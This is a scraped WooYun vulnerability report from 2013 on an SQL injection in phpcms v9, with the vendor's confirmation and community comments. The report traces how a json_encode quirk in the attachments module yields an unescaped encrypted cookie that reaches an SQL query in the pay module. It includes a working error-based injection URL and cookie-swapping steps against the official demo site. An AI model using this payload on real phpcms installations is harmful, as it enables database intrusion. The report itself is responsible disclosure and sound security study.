{"id": 10019, "wybug_id": "wooyun-2013-025107", "wybug_title": "phpcms v9 注入一枚", "wybug_corp": "phpcms", "wybug_author": "gainover", "wybug_date": "2013-06-04 10:21", "wybug_open_date": "2013-09-02 10:21", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-07-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-02：\t细节向公众公开  简要描述： PHPCMS某处代码缺陷导致SQL注入。 详细说明：  1. 首先是 /phpcms/modules/pay/spend_list.php  18          $userid  = param::get_cookie('_userid');  19          $sql =  \" `userid` = '$userid'\";可以看到，从cookies中取出_userid，然后代入sql语句中。如果这里cookies中的_userid我们可以构造，那么我们可以成功进行sql注入。2. 由于phpcms的cookies进过加密函数进行了转换， 而这个加密函数中似乎又用到了一个我们无法直接获取到的authkey -->pc_base::load_config('system', 'auth_key')3. 但是我们可以换个思路，程序在设置cookies，会调用set_cookie这个函数来进行get_cookies的逆向过程。  86  \tpublic static function set_cookie($var, $value = '', $time = 0) {  87          $time = $time > 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0);  88          $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0;  89          $var = pc_base::load_config('system','cookie_pre').$var;  90          $_COOKIE[$var] = $value;  91          if (is_array($value)) {  92              foreach($value as $k=>$v) {  93                  setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);  94              }  95          } else {  96              setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);  97          }  98      }4. 如果我们找到一个调用set_cookie的页面，并且传入的参数我们可以控制，那么是不是就有一点点希望了呢？ 但实际上这里有个大问题。   假如我们控制参数 userid,   userid='，   由于GPC/程序自己过滤，则 userid=\\'，   加密后是  userid=XXXXXXXXXXXX   解密后是  userid=\\' 我们会发现，这种想法实际上，最后。。。其实。。。根本还是无法造成注入的嘛--------------------------------------------------------也就是说，上面实际上说的是废话，构成不了威胁，关键是下面的部分啦。～--------------------------------------------------------5. 但是我们依然还是抱着上面的想法，找了找set_cookie的位置。我们找到了 /phpcms/modules/attachment/attachments.php 中的 以下代码： 228  \tpublic function swfupload_json() { 229          $arr['aid'] = intval($_GET['aid']); 230          $arr['src'] = trim($_GET['src']); 231          $arr['filename'] = urlencode($_GET['filename']); 232          $json_str = json_encode($arr); 233          $att_arr_exist = param::get_cookie('att_json'); 234          $att_arr_exist_tmp = explode('||', $att_arr_exist); 235          if(is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) { 236              return true; 237          } else { 238              $json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str; 239              param::set_cookie('att_json',$json_str); 240              return true;             241          } 242      }  可以看到这里设置了att_json这个cookies字段。   param::set_cookie('att_json',$json_str);  而$json_str来自于 json_encode($arr);   这个点有什么特别之处呢？特别之处在于 json_encode会将 \\ 转变为 \\\\  因而，我们的 $arr的 src=' 时，  由于GPC会转变为 src=\\'  由于json_encode，会转变为  {\"src\":\"\\\\'\"}  这样一来，单引号就不会转义啦，从而形成注入。 6. 接着就是利用过程，首先我们要利用set_cookie函数得到加密后的字符串。 在官方demo站，注册用户并登录，再访问以下URL。http://v9.demo.phpcms.cn/index.php?m=attachment&c=attachments&a=swfupload_json&src='%20and%20(select%201%20from%20(select%20count(*),concat(user(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20;%20--%201在chrome浏览器的cookies中，找到XXXXX_att_json这一条cookies数据，如下图：\n\n复制出这条COOKIES数据。再访问，http://v9.demo.phpcms.cn/index.php?m=pay&c=spend_list抓包修改COOKIES中的， XXXXX_userid这条数据，改为上面的XXXXX_att_json的数据，如下图：\n\n重新提交请求，可以看到报错后的注入信息。\n\n   漏洞证明：  对官方demo的测试见上方【详细说明】也写了个临时的exploit， 本地搭建环境中测试了下数据读取，需用户登录状态下来利用。\n\n   修复方案：  虽然注入是在/phpcms/modules/pay/spend_list.php进行的，但问题关键是 /phpcms/modules/attachment/attachments.php出现的。修复attachment/attachments.php中的问题。具体的，我等厂商们的修复方案，然后学习学习：）   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-06-04 13:16 厂商回复： 感谢提交漏洞，该漏洞其他人提交的漏洞相似。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-04 10:23 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  二哥开始搞注射了-_-#    \n     2013-06-04 10:27 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  不科学呀    \n     2013-06-04 10:36 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  吓尿。    \n     2013-06-04 10:48 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  GN终于开始行动了额。。哈哈    \n     2013-06-04 10:59 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  不科学啊    \n     2013-06-04 11:27 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  (⊙０⊙)    \n     2013-06-04 12:30 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  二哥开始连射了~    \n     2013-06-04 12:36 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  二哥开始抢生意了    \n     2013-06-04 13:07 |    \t\tHuGtion \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 学习安全技术。)\t\t \n  二哥开始连射了~~    \n     2013-06-04 16:25 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @gainover 二哥，不科学啊，你不是搞JS呢么，怎么跑出注射了- -    \n     2013-06-04 17:37 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  不科学啊    \n     2013-06-04 19:42 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  等待公开    \n     2013-06-04 21:29 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @鬼魅羊羔 乌云除了发漏洞，还可以学漏洞嘛。。别人可以学XSS，我也可以学着看PHP代码的:)    \n     2013-06-04 21:36 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这厂商回复神马意思。。。    \n     2013-06-04 21:50 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @px1624 厂商是告诉咱们，所有的注射，都可以看做相似，，懂了么亲？    \n     2013-06-05 18:35 |    \t\t堕络 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 一个新手菜鸟 求关爱)\t\t \n  只要是注射 就是一样的    \n     2013-06-06 12:37 |    \t\tGetshell \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        )\t\t \n  好犀利...    \n     2013-07-04 16:47 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  我家院子里种了很多草，专门吸引大牛来吃草，吃完了就可以挤奶了。    \n     2013-07-08 15:17 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n   WooYun: PHPCMS最新版(V9)SQL注入一枚 确实是类似啊，厂商蛮不错的，照给rank    \n     2013-09-12 12:26 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  确实给力。。    \n     2013-09-17 17:14 |    \t\t天鱼 \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:5        | 逝去的梦)\t\t \n  简直神人啊    \n     2014-09-20 20:03 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  1    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}